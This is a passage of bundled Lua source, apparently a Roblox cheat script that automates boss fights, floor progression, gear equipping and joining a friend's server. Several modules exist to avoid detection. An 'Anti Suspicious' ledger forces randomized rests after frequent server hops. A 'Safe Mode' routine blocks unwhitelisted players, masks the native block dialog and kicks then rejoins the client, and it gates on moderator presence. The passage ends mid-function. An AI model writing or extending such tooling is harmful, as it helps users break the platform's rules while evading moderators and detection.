        local _,button=ctx.Find(target)
        if button then ctx.Click(button)end
        return false
    end
    return function(target,active)
        local initial=ctx.Find(target)
        if not active()then return false end
        if not initial then ctx.Prompt(target)end
        local expires=ctx.Now()+8
        local ready
        repeat
            if not active()then return cancel(target)end
            local button=ctx.Find(target)
            if button and ctx.Ready(button)then ready=button;break end
            ctx.Sleep(.03)
        until ctx.Now()>=expires
        assert(ready,"Roblox block dialog did not open; no rejoin attempted")
        local began=ctx.Now()
        local geometry=ctx.Key(ready)
        local geometryAt=began
        local clickAt=began+.1
        local clicked=0
        local receiptAt
        repeat
            if not active()then return cancel(target)end
            local now=ctx.Now()
            if ctx.Blocked(target)then
                receiptAt=receiptAt or now
                if now-receiptAt>=ctx.Settle()then return true end
            else
                receiptAt=nil
                local button=ctx.Find(target)
                if button and ctx.Ready(button)and clicked<4 then
                    local key=ctx.Key(button)
                    if key~=geometry then geometry=key;geometryAt=now end
                    if now>=clickAt and now-geometryAt>=.06 then
                        ctx.Click(button)
                        clicked=clicked+1
                        clickAt=ctx.Now()+.3
                    end
                end
            end
            ctx.Sleep(.03)
        until ctx.Now()>=began+10
        error("Roblox did not confirm the block; no rejoin attempted")
    end
end

-- END BUNDLED BLOCK CONFIRM
    end)()
    local makeBlockMask=(function()
-- BEGIN BUNDLED BLOCK UI MASK
-- Reversible alpha overlay owned only while a native block prompt is active.
return function(ctx)
    local api={}
    local session
    local function properties(object)
        local fields={}
        local kinds={GuiObject={"BackgroundTransparency"},ImageLabel={"ImageTransparency"},ImageButton={"ImageTransparency"},
            TextLabel={"TextTransparency","TextStrokeTransparency"},TextButton={"TextTransparency","TextStrokeTransparency"},
            TextBox={"TextTransparency","TextStrokeTransparency"},UIStroke={"Transparency"},CanvasGroup={"GroupTransparency"}}
        for class,names in pairs(kinds)do if object:IsA(class)then for _,name in ipairs(names)do fields[name]=true end end end
        return fields
    end
    local function overlay(active,object)
        local fields=properties(object)
        if next(fields)==nil then return end
        local saved=active.Saved[object]
        if not saved then saved={};active.Saved[object]=saved end
        for property in pairs(fields)do
            if saved[property]==nil then saved[property]=object[property]end
            object[property]=1
        end
    end
    function api.End()
        local active=session;session=nil
        if not active then return end
        for _,connection in ipairs(active.Connections)do connection:Disconnect()end
        for object,saved in pairs(active.Saved)do
            if object.Parent then for property,value in pairs(saved)do pcall(function()object[property]=value end)end end
        end
        table.clear(active.Saved);table.clear(active.Modals);table.clear(active.Connections)
    end
    function api.Begin()
        api.End()
        local active={Saved={},Modals={},Connections={}}
        session=active
        local function discover(object)
            if session~=active then return end
            if object.Name=="BlockingModal"and object:IsA("GuiObject")then
                active.Modals[object]=true;overlay(active,object)
                for _,child in ipairs(object:QueryDescendants("GuiObject, UIStroke"))do overlay(active,child)end
                return
            end
            local parent=object.Parent
            while parent and parent~=ctx.Root do
                if active.Modals[parent]then overlay(active,object);return end
                parent=parent.Parent
            end
        end
        local ok,reason=pcall(function()
            active.Connections[1]=ctx.Root.DescendantAdded:Connect(discover)
            for _,modal in ipairs(ctx.Root:QueryDescendants("#BlockingModal"))do discover(modal)end
            active.Connections[2]=ctx.Render:Connect(function()
                for object,saved in pairs(active.Saved)do
                    if object.Parent then for property in pairs(saved)do object[property]=1 end
                    else active.Saved[object]=nil;active.Modals[object]=nil end
                end
            end)
        end)
        if not ok then api.End();error(reason)end
    end
    api.Destroy=api.End
    return api
end

-- END BUNDLED BLOCK UI MASK
    end)()
    local makeFriend=(function()
-- BEGIN BUNDLED AUTO JOIN FRIEND
-- Resolve identities lazily and protect every yielding step with a generation token.
return function(ctx)
    local state=ctx.State
    local api={}
    local generation,due=0,0
    local operation
    local identity={}
    local function status(message)state.AutoJoinFriendStatus=message end
    function api.Reset()
        generation=generation+1;due=0;identity={}
        status(state.AutoJoinFriend and "Checking friend..."or "Auto Join Friend is off")
    end
    local function blocked()
        local gates={{state.ModeratorBlocking,"moderator protection"},{state.SafeModePanic,"Safe Mode protection"},
            {state.TravelBusy,"current movement"},{state.AutomationTeleporting,"teleport in progress"},
            {state.AccountProgression,"Account Progression owns floor travel"}}
        for _,gate in ipairs(gates)do if gate[1]then return gate[2]end end
    end
    function api.Update(now)
        if not state.AutoJoinFriend then status("Auto Join Friend is off");return end
        if not state.Running then return end
        if state.StopEverything then status("Paused · Stop Everything is on");return end
        if operation then return end
        local name=tostring(state.JoinFriendUsername or ""):match("^%s*(.-)%s*$"):gsub("^@","")
        if name==""then status("Enter a Roblox username");return end
        if #name>20 or not name:match("^[%w_]+$")then status("Enter a username, not a display name");return end
        local gate=blocked()
        if gate then status("Waiting · "..gate);return end
        if now<due then return end
        due=now+20
        local ticket={generation=generation};operation=ticket
        local function current()
            return generation==ticket.generation and state.Running and not state.StopEverything and state.AutoJoinFriend
        end
        local function ready()
            return current()and not(state.ModeratorBlocking or (state.SafeModePanic and not state.AutoJoinFriendHolding)
                or state.TravelBusy or state.AutomationTeleporting or state.AccountProgression)
        end
        status("Checking @"..name)
        ctx.Spawn(function()
            local ok,reason=pcall(function()
                local canonical=name:lower()
                if identity.name~=canonical then
                    local id=ctx.Resolve(name)
                    if not current()then return end
                    assert(type(id)=="number"and id>0,"Username was not found")
                    identity={name=canonical,id=id}
                end
                if not ready()then return end
                if identity.id==ctx.LocalUserId then status("Choose another player");return end
                if ctx.Present(identity.id)then status("Joined @"..name.." · staying in this server");return end
                if state.SafeMode and not(state.SafeWhitelistIds and state.SafeWhitelistIds[tostring(identity.id)])then
                    status("Add @"..name.." to the Safe Mode whitelist first");return
                end
                ctx.Queue()
                if not ready()then return end
                status("Joining @"..name)
                local result=ctx.Join(identity.id,ready)
                if current()then status(type(result)=="string"and result~=""and result or "Join requested · waiting for teleport")end
            end)
            if operation==ticket then operation=nil end
            if not ok and current()then status("Retrying · "..tostring(reason))end
        end)
    end
    api.Reset()
    return api
end

-- END BUNDLED AUTO JOIN FRIEND
    end)()
    local makeKickFallback=(function()
-- BEGIN BUNDLED SAFE KICK FALLBACK
-- Recovery starts only after the normal confirmed-block rejoin was dispatched.
return function(ctx)
    local api={Armed=false,Attempts=0,Started=false}
    local pendingId,pendingRest
    local epoch=0
    local executing=false
    local failures,retryDue=0,0
    local function enabled()return ctx.Active()and ctx.Job()==ctx.InitialJob end
    local function started()return api.Started or ctx.Started and ctx.Started()end
    function api.Reset()
        epoch+=1;pendingId=nil;pendingRest=nil;failures=0;retryDue=0
        api.Armed=false;api.Started=false;api.Attempts=0
    end
    function api.MarkStarted()api.Started=true end
    function api.Requested(userId,restSeconds)
        if executing or api.Armed then return end
        pendingId=userId;pendingRest=restSeconds;api.Started=false
        api.Update(ctx.Now())
    end
    function api.TeleportFailed()
        if pendingId and not api.Armed then api.Started=false;api.Update(ctx.Now())end
    end
    function api.Update(now)
        if api.Armed or not enabled()or started()or not pendingId then return end
        local target
        for _,person in ipairs(ctx.Players())do
            if person.UserId==pendingId and not ctx.Allowed(person)then target=person;break end
        end
        if not target then pendingId=nil;pendingRest=nil;failures=0;retryDue=0;return end
        if executing or failures>=3 or now<retryDue then return end
        executing=true
        local token=epoch
        local restSeconds,restUntil,kicked=pendingRest
        local function valid()
            return token==epoch and enabled()and ctx.Present(target)and not ctx.Allowed(target)
        end
        local function recovery()
            ctx.Sleep(.2)
            if restUntil then
                if not kicked then return end
                while token==epoch and enabled()and not started()do
                    local remaining=restUntil-ctx.WallTime()
                    if remaining<=0 then break end
                    ctx.Sleep(math.min(remaining,30))
                end
            end
            for attempt=1,3 do
                if token~=epoch or not enabled()or started()then return end
                api.Attempts=attempt
                local sent,reason=pcall(ctx.Rejoin)
                if not sent then ctx.Status("Fallback rejoin · "..tostring(reason))end
                ctx.Sleep(3)
            end
            if enabled()and not started()then ctx.Status("Fallback rejoin unavailable · rejoin manually")end
        end
        ctx.Spawn(function()
            local ok,reason=pcall(function()
                ctx.Sleep(0)
                if not valid()or started()then return end
                if ctx.CheckLimits then ctx.CheckLimits(restSeconds)end
                ctx.Pause()
                if not valid()then return end
                assert(ctx.Block(target,valid)==true,"Native block was not confirmed · no kick")
                if not valid()then return end
                ctx.Prepare(target,restSeconds)
                if not valid()or started()then return end
                if restSeconds then
                    restUntil=ctx.CommitRest(restSeconds)
                    assert(restUntil,"Rest deadline could not be saved · no kick")
                end
                api.Armed=true
                ctx.Status(restUntil and "Blocked · kicking for Anti Suspicious rest"or "Blocked · rejoin not started · kicking and rejoining")
                ctx.Spawn(recovery)
                ctx.Kick("Safe Mode: blocked @"..target.Name.." before automatic rejoin.")
                kicked=true
            end)
            executing=false;ctx.Finish()
            if not ok then
                failures+=1;retryDue=ctx.Now()+math.min(8,2^failures)
                ctx.Status("Safe fallback · "..tostring(reason))
            end
        end)
    end
    return api
end

-- END BUNDLED SAFE KICK FALLBACK
    end)()
    local makeRest=(function()
-- BEGIN BUNDLED ANTI SUSPICIOUS
-- Account-scoped rolling history and an absolute rest deadline.
return function(ctx)
    local maxWindow=200*60
    local maxHops=100
    local ledger={Version=1,Armed=false,Hops={}}
    local function prune(hops,now)
        local recent={}
        for i=math.max(1,#hops-maxHops+1),#hops do
            local at=hops[i]
            if type(at)=="number" and at<=now and at>now-maxWindow then recent[#recent+1]=at end
        end
        return recent
    end
    local ok,saved=pcall(ctx.Load)
    if ok and type(saved)=="table" and saved.Version==1 and type(saved.Hops)=="table" then
        local now=ctx.Now()
        ledger.Armed=saved.Armed==true
        ledger.Hops=prune(saved.Hops,now)
        if type(saved.Until)=="number" and saved.Until>now and saved.Until<=now+maxWindow then
            ledger.Until=saved.Until
        end
    end
    local api={}
    local retryAt=0
    local function persist(nextLedger)
        local ok,result=pcall(ctx.Save,nextLedger)
        local written=ok and result~=false
        if written then ledger=nextLedger end
        return written
    end
    function api.Deadline()
        local untilAt=ledger.Until
        return untilAt and untilAt>ctx.Now() and untilAt or nil
    end
    function api.ObserveProtected()
        if not ctx.Enabled() or ledger.Armed or api.Deadline() or ctx.Now()<retryAt then return end
        local nextLedger={Version=1,Armed=true,Hops=ledger.Hops}
        if not persist(nextLedger) then retryAt=ctx.Now()+30 end
    end
    function api.Departure()
        if not ctx.Enabled() or not ledger.Armed or api.Deadline() then return end
        local now,limits=ctx.Now(),ctx.Limits()
        local hops=prune(ledger.Hops,now)
        if #hops>=maxHops then table.remove(hops,1)end
        hops[#hops+1]=now
        if not persist({Version=1,Armed=true,Hops=hops})then return end
        local count=0
        for _,at in ipairs(hops)do if at>now-limits.Window*60 then count+=1 end end
        if count>=limits.Hops then return ctx.Random(limits.Min*60,limits.Max*60) end
    end
    function api.Commit(seconds)
        local deadline=ctx.Now()+seconds
        if persist({Version=1,Armed=false,Hops={},Until=deadline})then return deadline end
    end
    return api
end

-- END BUNDLED ANTI SUSPICIOUS
    end)()
    attach({MakeBlockMask=makeBlockMask,MakeKickFallback=makeKickFallback,MakeRest=makeRest,SavePreferences=requestSave,Make=make,MakeSafe=makeSafe,MakeMulti=makeMulti,MakeCatalog=makeCatalog,MakeUI=makeUI,MakeFriend=makeFriend,BlockPoint=blockPoint,MakeBlockConfirm=makeBlockConfirm,
        State=state,Player=player,Players=Players,Bind=bind,Button=uiButton,Label=uiLabel,Create=create,
        Corner=corner,Reveal=revealOptions,Parent=content})
end

-- Account Progression owns only boss selection and cross-floor sequencing.
do
    local makeController=(function()
-- BEGIN BUNDLED ACCOUNT PROGRESSION
-- Progression checkpoints advance only after observed credited boss death and unlocks.
return function(ctx)
    local state=ctx.State
    local api={Phase="Idle",Attempts=0}
    local travel={spot=nil,deadline=nil,waiting=nil,scout=1,due=0,unlock=nil}
    local function publish(phase,message)
        api.Phase=phase;state.ProgressionPhase=phase;ctx.Status(message)
    end
    local function release()
        ctx.Release();travel.spot=nil;travel.deadline=nil;travel.waiting=nil
    end
    function api.Pause(reason)
        api.Paused=true;api.LastError=tostring(reason)
        ctx.Release();publish("Paused","Paused · "..tostring(reason).." · toggle OFF/ON to retry")
    end
    function api.Reset()
        api.Paused=false;api.LastError=nil;api.Attempts=0
        travel={spot=nil,deadline=nil,waiting=nil,scout=1,due=0,unlock=nil}
        ctx.Release()
        publish("Idle",state.AccountProgression and "Starting account progression..."or "Account Progression is off")
    end
    local function failure(now,reason)
        api.Attempts=api.Attempts+1
        release()
        if api.Attempts>=3 then api.Pause(reason);return end
        travel.due=now+api.Attempts*2
        publish("Retrying","Retrying boss travel · "..tostring(reason))
    end
    local function change(floor,now)
        publish("Changing floor","Returning to the teleport pad · F"..floor.Number)
        travel.due=now+2
        local ok,reason=ctx.ChangeFloor(floor)
        if not ok then api.Pause(reason or "Floor travel failed")end
    end
    local function advance(now)
        local number=state.ProgressionFloor+1
        if number==6 then number=7 end
        local floor=ctx.Floor(number)
        if not floor then api.Pause("Floor "..number.." is unavailable");return end
        if not ctx.Unlocked(floor)then
            if state.ProgressionFloor~=6 then
                travel.unlock=travel.unlock or now
                if now-travel.unlock>=8 then
                    state.ProgressionBossCleared=false;state.ProgressionBossClearedName=nil
                    travel.unlock=nil;release();ctx.Save()
                    publish("Rechecking boss","Next floor is still locked · returning to the current main boss")
                    return
                end
            end
            publish("Waiting for unlock","Boss defeated · waiting for F"..number.." unlock")
            return
        end
        release();travel.unlock=nil;api.Attempts=0
        state.ProgressionFloor=number;state.ProgressionBossCleared=false;state.ProgressionBossClearedName=nil
        ctx.Save();change(floor,now)
    end
    local function arrival(now)
        if not travel.deadline then return true end
        if ctx.Moving()then
            if now>travel.deadline then failure(now,"Boss travel timed out")end
            return false
        end
        if not ctx.Arrived(travel.spot)then failure(now,"Boss arrival was not confirmed");return false end
        travel.deadline=nil;api.Attempts=0;travel.waiting=now
        ctx.Arrival();publish("Fighting","Waiting for the main boss · F"..state.ProgressionFloor)
        return true
    end
    local function fight(floor,now)
        if not ctx.CombatReady()then publish("Waiting for combat","Enable Kill Aura and Auto Farm to continue");return end
        ctx.Equipment(now)
        if travel.spot and not travel.deadline and ctx.NearBossSpot and not ctx.NearBossSpot(travel.spot)then release()end
        if not arrival(now)then return end
        if not travel.spot then
            local spot=ctx.BossSpot(floor,travel.scout)
            if not spot then publish("Finding boss","Waiting for the main boss arena to load · F"..floor.Number);return end
            travel.spot=spot
            local sent,reason=ctx.Go(spot)
            if not sent then failure(now,reason or "Boss arena is unavailable");return end
            travel.deadline=now+15
            publish("Travelling to boss","Moving to the main boss · F"..floor.Number)
            return
        end
        local boss=ctx.Boss(travel.spot)
        if boss and boss.Defeated and boss.Credited then
            state.ProgressionBossCleared=true;state.ProgressionBossClearedName=boss.Name
            release();ctx.Save();publish("Boss defeated","Main boss defeated · F"..floor.Number)
            return
        end
        publish("Fighting",boss and boss.Alive and ("Defeating "..boss.Name.." · F"..floor.Number)
            or ("Waiting for the main boss to spawn · F"..floor.Number))
        if travel.spot.Scout and not(boss and boss.Alive)and now-(travel.waiting or now)>=20 then
            travel.scout=travel.scout+1;release()
        end
    end
    function api.Update(now)
        if not state.AccountProgression or not state.Running or state.StopEverything or api.Paused then return end
        if ctx.SyncFloor then ctx.SyncFloor()end
        if state.ProgressionComplete then publish("Complete","Complete · F12 boss defeated · toggle OFF to restore your modes");return end
        if not ctx.Ready()then travel.unlock=nil;publish("Waiting","Waiting for protection, character or current movement");return end
        if now<travel.due then return end
        local number=state.ProgressionFloor
        local floor=ctx.Floor(number)
        if not floor then api.Pause("Floor "..tostring(number).." is unavailable");return end
        if number==6 then advance(now);return end
        if ctx.CurrentFloor()~=floor.Id then
            if ctx.Unlocked(floor)then change(floor,now)else api.Pause("F"..number.." is locked")end
            return
        end
        if not state.ProgressionBossCleared then fight(floor,now);return end
        if number~=12 then advance(now);return end
        state.ProgressionComplete=true;ctx.Complete();ctx.Save()
        publish("Complete","Complete · F12 boss defeated · toggle OFF to restore your modes")
    end
    function api.Destroy()ctx.Release()end
    return api
end

-- END BUNDLED ACCOUNT PROGRESSION
    end)()
    local makeGear=(function()
-- BEGIN BUNDLED PROGRESSION GEAR
-- Build an owned-gear ordering, then reconcile one replicated equipment operation.
return function(ctx)
    local api={Dirty=true}
    local request
    local readAt=0
    local failures=0
    local function value(item,name,snapshot)
        local base=tonumber(item.Stats[name])
        if not base then return 0 end
        if item.Scale then base=base*item.Scale*snapshot.Level end
        if item.MatchBest then base=base+(snapshot.Highest[name]or 0)*item.MatchBest end
        base=math.floor(base)
        local grades=ctx.Rarity.RarityUpgrades
        local maximum=grades[item.Rarity]or grades.Common
        if maximum and item.Upgrade>0 then
            local levels=ctx.Rarity.UpgradeLevelMultipliers
            local factor=name=="Damage"and (tonumber(item.Stats.DamageUpgrade)or levels[maximum]or levels.default)or levels.default
            base=math.floor(base+base*item.Upgrade*factor/maximum)
        end
        return base
    end
    local function candidates(snapshot)
        local buckets={weapons={},armor={},accessories={}}
        local worn={}
        for _,id in pairs(snapshot.Equip)do worn[id]=true end
        local function compare(a,b)
            if a.Score~=b.Score then return a.Score>b.Score end
            if a.Utility~=b.Utility then return a.Utility>b.Utility end
            if worn[a.Id]~=worn[b.Id]then return worn[a.Id]==true end
            return a.Id<b.Id
        end
        for _,item in ipairs(snapshot.Items)do
            if item.Level<=snapshot.Level and not item.Skin then
                item.Damage=value(item,"Damage",snapshot)
                item.Defense=value(item,"Defense",snapshot)
                item.Utility=0
                for _,stat in ipairs({"Critical","Lifesteal","HealthRegeneration","StaminaRegeneration"})do
                    item.Utility=item.Utility+(tonumber(item.Stats[stat])or 0)
                end
                local group
                if item.Type=="Weapon"then item.Score=item.Damage;group=buckets.weapons
                elseif item.Type=="Clothing"and item.Damage==0 and item.Defense>0 then item.Score=item.Defense;group=buckets.armor
                elseif item.Type=="Accessory"and (item.Damage>0 or item.Defense>0 or item.Utility>0)then
                    item.Score=item.Damage/math.max(1,snapshot.Highest.Damage or 1)
                        +item.Defense/math.max(1,snapshot.Highest.Defense or 1)+item.Utility/100
                    group=buckets.accessories
                end
                if group then group[#group+1]=item end
            end
        end
        for _,group in pairs(buckets)do table.sort(group,compare)end
        return buckets
    end
    function api.Plan(snapshot)
        local ranked=candidates(snapshot)
        local operations={}
        local lookup={}
        for _,item in ipairs(snapshot.Items)do lookup[item.Id]=item end
        local function add(action,item,slot)
            operations[#operations+1]={Action=action,Item=item,Slot=slot}
        end
        local weapon=ranked.weapons[1]
        if weapon and not(ctx.SkipWeapons and ctx.SkipWeapons())then
            local left=snapshot.Equip.Left
            if left and left~=0 and lookup[left]then add("Unequip",lookup[left],"Left")end
            if snapshot.Equip.Right~=weapon.Id then add("EquipWeapon",weapon,"Right")end
        end
        if ctx.WeaponsOnly and ctx.WeaponsOnly()then return operations end
        local armor=ranked.armor[1]
        if armor and snapshot.Equip.Clothing~=armor.Id then add("Wear",armor,"Clothing")end
        local wanted={}
        for index=1,math.min(2,#ranked.accessories)do wanted[ranked.accessories[index].Id]=true end
        local existing={}
        for _,slot in ipairs({"Accessory1","Accessory2"})do
            local id=snapshot.Equip[slot]
            if id and id~=0 then
                existing[id]=true
                if not wanted[id]and next(wanted)and lookup[id]then add("Unequip",lookup[id],slot)end
            end
        end
        for index=1,math.min(2,#ranked.accessories)do
            local item=ranked.accessories[index]
            if not existing[item.Id]then add("Wear",item,"Accessory")end
        end
        return operations
    end
    local function acknowledged(snapshot,operation)
        if operation.Action=="Unequip"then return snapshot.Equip[operation.Slot]~=operation.Item.Id end
        if operation.Slot=="Accessory"then
            return snapshot.Equip.Accessory1==operation.Item.Id or snapshot.Equip.Accessory2==operation.Item.Id
        end
        return snapshot.Equip[operation.Slot]==operation.Item.Id
    end
    local function reject(reason)
        failures=failures+1;api.Error=reason
        if failures>=3 then api.Paused=true end
        ctx.Status(reason)
    end
    function api.Invalidate()api.Dirty=true end
    function api.HasWork()return api.Dirty or request~=nil end
    function api.Reset()
        request=nil;readAt=0;failures=0;api.Paused=false;api.Error=nil;api.Dirty=true
    end
    function api.Update(now)
        if api.Paused or now<readAt or not ctx.Active()or ctx.Busy()then return end
        readAt=now+.3
        if not request and not api.Dirty then return end
        local snapshot=ctx.Read()
        if not snapshot then return end
        if request then
            local completed=acknowledged(snapshot,request)
            if not completed and now<request.Deadline then return end
            if completed then failures=0;api.Error=nil
            else reject("Equipment was not acknowledged: "..request.Item.Name)end
            request=nil
            if api.Paused then return end
        end
        local operation=api.Plan(snapshot)[1]
        if not operation then
            api.Dirty=false;readAt=now+1;ctx.Status("Best usable gear equipped");return
        end
        if not ctx.Active()or ctx.Busy()then return end
        local sent,reason=ctx.Equip(operation)
        if not sent then reject(tostring(reason or "Equipment request failed"));readAt=now+2;return end
        operation.Deadline=now+4;request=operation
        ctx.Status("Equipping "..operation.Item.Name)
    end
    return api
end

-- END BUNDLED PROGRESSION GEAR
    end)()
    local attach=(function()
-- BEGIN BUNDLED PROGRESSION CLIENT
-- Native inventory, boss-observation and travel bindings for the progression machine.
return function(ctx)
    local state,player=ctx.State,ctx.Player
    local rs=game.ReplicatedStorage
    local profile=rs.Profiles:FindFirstChild(player.Name)
    local inventory,equip=profile.Inventory,profile.Equip
    local definitions=rs.Database.Items
    local closed=false
    local equipmentWorker
    local observation
    local watched={}
    local ui=state.UI
    ui.ProgressionToggle=ctx.Button("AccountProgression","Account Progression · OFF",10,34,ctx.Parent)
    ui.ProgressionStatus=ctx.Label("ProgressionStatus","Account Progression is off",20,64)
    ui.ProgressionGear=ctx.Label("ProgressionGear","Owned usable swords, armor and accessories",30,48)
    ui.ProgressionStatus.Parent=ctx.Parent;ui.ProgressionGear.Parent=ctx.Parent
    ui.ProgressionStatus.TextWrapped=true;ui.ProgressionGear.TextWrapped=true
    local function text(label,value)if label.Text~=value then label.Text=value end end
    local function field(object,name,default)
        local value=object and object:FindFirstChild(name)
        if value and value:IsA("ValueBase")then return value.Value end
        return default
    end
    local function matches(spot,mob)
        if not spot.EncounterNames then return true end
        local name=mob.Name:lower():gsub("[^%w]","")
        for candidate in pairs(spot.EncounterNames)do if candidate:lower():gsub("[^%w]","")==name then return true end end
        return false
    end
    local function clearBoss()
        local old=observation;observation=nil;state.ProgressionBossMob=nil
        if old then for _,connection in ipairs(old.connections)do connection:Disconnect()end end
    end
    local function credit(record)
        local amount=ctx.OwnDamage(record.health)
        record.high=math.max(record.high,amount or 0)
    end
    local function observe(mob,data)
        clearBoss()
        local own=ctx.OwnDamage(data.Health)or 0
        local record={mob=mob,health=data.Health,lives=data.HitLives,baseline=own,high=own,connections={}}
        observation=record;state.ProgressionBossMob=mob
        local function bind(signal,callback)record.connections[#record.connections+1]=signal:Connect(callback)end
        local function changed()
            credit(record)
            if record.health.Value<=0 and (not record.lives or record.lives.Value<=0)then
                record.dead=true;record.diedAt=record.diedAt or os.clock()
            end
        end
        bind(record.health:GetPropertyChangedSignal("Value"),changed)
        if record.lives then bind(record.lives.Changed,changed)end
        bind(record.health.ChildAdded,function(value)
            if value.Name==player.Name and value:IsA("ValueBase")then credit(record);bind(value.Changed,function()credit(record)end)end
        end)
        local counter=record.health:FindFirstChild(player.Name)
        if counter then bind(counter.Changed,function()credit(record)end)end
    end
    local function gearActive()
        if closed or not state.Running or state.StopEverything or state.ModeratorBlocking then return false end
        if state.AccountProgression then return not state.ProgressionComplete end
        return state.AutoEquipBestSword
    end
    local function gearSnapshot()
        local snapshot={Level=math.floor(profile.Stats.Exp.Value^(1/3)),Items={},Equip={},
            Highest={Damage=player:GetAttribute("HighestDamage")or 0,Defense=player:GetAttribute("HighestDefense")or 0}}
        for _,slot in ipairs(equip:GetChildren())do if slot:IsA("IntValue")then snapshot.Equip[slot.Name]=slot.Value end end
        for _,item in ipairs(inventory:GetChildren())do
            local definition=definitions:FindFirstChild(item.Name)
            local stats=definition and definition:FindFirstChild("Stats")
            if item:IsA("IntValue")and stats then
                local values={}
                for _,stat in ipairs(stats:GetChildren())do if stat:IsA("ValueBase")then values[stat.Name]=stat.Value end end
                local match=definition:FindFirstChild("MatchBest")
                snapshot.Items[#snapshot.Items+1]={Native=item,Id=item.Value,Name=item.Name,
                    Type=field(definition,"Type",""),Class=field(definition,"Class",""),
                    Level=field(definition,"Level",0),Rarity=field(definition,"Rarity","Common"),Upgrade=field(item,"Upgrade",0),
                    Skin=field(definition,"Type","")=="Accessory"and item:FindFirstChild("Skin")~=nil,
                    Scale=field(definition,"ScaleByLevel",nil),
                    MatchBest=match and (match:IsA("ValueBase")and tonumber(match.Value)or 1)or nil,Stats=values}
            end
        end
        return snapshot
    end
    local gear=ctx.MakeGear({
        Active=gearActive,SkipWeapons=function()return state.AutoEquipBestSword==false end,WeaponsOnly=function()return false end,
        Rarity=require(rs.Shared.Library.RarityData),Read=gearSnapshot,
        Busy=function()return state.AutoTradeBusy or state.SafeModePanic or state.TravelBusy or state.AutomationTeleporting
            or state.Dodging or state.Recovering or state.SkillCastRunning or state.MiscCastRunning or ctx.SkillsBusy()end,
        Equip=function(operation)
            if not gearActive()or operation.Item.Native.Parent~=inventory then return false,"Equipment changed"end
            ctx.StopCombat("Equipping best usable weapon / gear")
            local payload={operation.Action,operation.Item.Native}
            if operation.Action=="EquipWeapon"then payload[3]=operation.Slot end
            if rs.Function:InvokeServer("Equipment",payload)==false then return false,"Equipment request was rejected"end
            return true
        end,
        Status=function(message)state.ProgressionGearStatus=message;text(ui.ProgressionGear,message)end})
    state.ProgressionGearController=gear
    function state.IsAutoEquipmentCandidate(item)
        if not gearActive()then return false end
        for _,operation in ipairs(gear.Plan(gearSnapshot()))do
            if operation.Action~="Unequip"and operation.Item.Native==item then return true end
        end
        return false
    end
    local function invalidate()if not closed then gear.Invalidate()end end
    local function watch(value)
        if not watched[value]then watched[value]=value.Changed:Connect(invalidate)end
    end
    local function forget(value)
        local connection=watched[value];watched[value]=nil
        if connection then connection:Disconnect()end
    end
    ctx.Bind(inventory.DescendantAdded,function(value)
        invalidate();if value.Name=="Upgrade"and value:IsA("ValueBase")then watch(value)end
    end)
    ctx.Bind(inventory.DescendantRemoving,function(value)forget(value);invalidate()end)
    ctx.Bind(equip.DescendantAdded,function(value)invalidate();if value:IsA("ValueBase")then watch(value)end end)
    ctx.Bind(equip.DescendantRemoving,function(value)forget(value);invalidate()end)
    for _,value in ipairs(inventory:QueryDescendants("#Upgrade"))do if value:IsA("ValueBase")then watch(value)end end
    for _,value in ipairs(equip:GetChildren())do if value:IsA("ValueBase")then watch(value)end end
    ctx.Bind(profile.Stats.Exp.Changed,invalidate)
    ctx.Bind(player:GetAttributeChangedSignal("HighestDamage"),invalidate)
    ctx.Bind(player:GetAttributeChangedSignal("HighestDefense"),invalidate)
    local function cancelEquipment()
        if equipmentWorker then pcall(task.cancel,equipmentWorker);equipmentWorker=nil end
        state.ProgressionEquipping=false
    end
    local function equipment(now)
        if equipmentWorker or gear.Paused or not gear.HasWork()then return end
        local thread=task.spawn(function()
            state.ProgressionEquipping=true
            local ok,reason=pcall(gear.Update,now)
            state.ProgressionEquipping=false;equipmentWorker=nil
            if not ok then gear.Paused=true;gear.Error=tostring(reason);text(ui.ProgressionGear,gear.Error)end
        end)
        if coroutine.status(thread)=="dead"then return end
        equipmentWorker=thread
        task.delay(8,function()
            if closed or equipmentWorker~=thread then return end
            cancelEquipment();gear.Paused=true
            gear.Error="Equipment request timed out · toggle Auto Farm or progression OFF/ON to retry"
            text(ui.ProgressionGear,gear.Error)
        end)
    end
    local swordActive=false
    function state.UpdateBestSword(now)
        local active=not state.AccountProgression and state.AutoEquipBestSword
        if swordActive~=active then swordActive=active;gear.Reset()end
        if active then equipment(now)end
    end
    local function root()
        return player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    end
    local function release()
        clearBoss();state.ProgressionAnchor=nil
        if state.ProgressionTravelOwned and state.TravelBusy then state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false end
        state.ProgressionTravelOwned=false;state.TravelHold=false;state.TravelHoldPosition=nil
        ctx.StopCombat("Progression movement released")
    end
    local function complete()
        ctx.StopCombat("Account progression complete")
        state.SetAutoFarm(false,"Account progression complete");state.SetEnabled(false)
    end
    local function syncFloor()
        if not state.AccountProgression or state.SafeFloorId==game.PlaceId then return end
        for _,floor in ipairs(state.AutomationCatalog.Floors)do
            if floor.Id==game.PlaceId then
                state.SafeFloorId=game.PlaceId;state.SaveNow()
                if state.RefreshAutomationUI then state.RefreshAutomationUI()end
                return
            end
        end
    end
    local function bossSpot(floor,index)
        local catalog=state.AutomationCatalog
        catalog.AddCurrent(state.FloorDestinations,game.PlaceId)
        local primary=catalog.SpotById and catalog.SpotById[tostring(floor.Id).."/Boss"]
        if primary then return primary end
        local scouts={}
        for _,spot in ipairs(catalog.Spots)do
            if spot.PlaceId==floor.Id and spot.MainBoss then return spot end
        end
        for _,spot in ipairs(catalog.Spots)do
            if spot.PlaceId==floor.Id then
                if spot.Kind=="Boss"then return spot end
                if floor.Number==12 and spot.Kind=="Arena"then scouts[#scouts+1]=spot end
            end
        end
        table.sort(scouts,function(a,b)return a.Id<b.Id end)
        local spot=scouts[(index-1)%math.max(1,#scouts)+1]
        if spot then return {Id=spot.Id,PlaceId=spot.PlaceId,Name=spot.Name,Kind=spot.Kind,
            DestinationId=spot.DestinationId,Position=spot.Position,Scout=true}end
    end
    local function readBoss(spot)
        if observation and not matches(spot,observation.mob)then clearBoss()end
        local record=observation
        if record then
            credit(record)
            if record.dead or record.health.Value<=0 and (not record.lives or record.lives.Value<=0)then
                record.diedAt=record.diedAt or os.clock()
                if record.high>record.baseline or os.clock()-record.diedAt<1 or record.mob.Parent then
                    return {Defeated=true,Credited=record.high>record.baseline,Name=record.mob.Name}
                end
                clearBoss();return
            end
            if record.mob.Parent and record.health.Parent then return {Alive=true,Name=record.mob.Name}end
            clearBoss()
        end
        for mob in pairs(ctx.Mobs())do
            if mob.Parent and ctx.Rank(mob)==1 and matches(spot,mob)then
                local data=ctx.Data(mob)
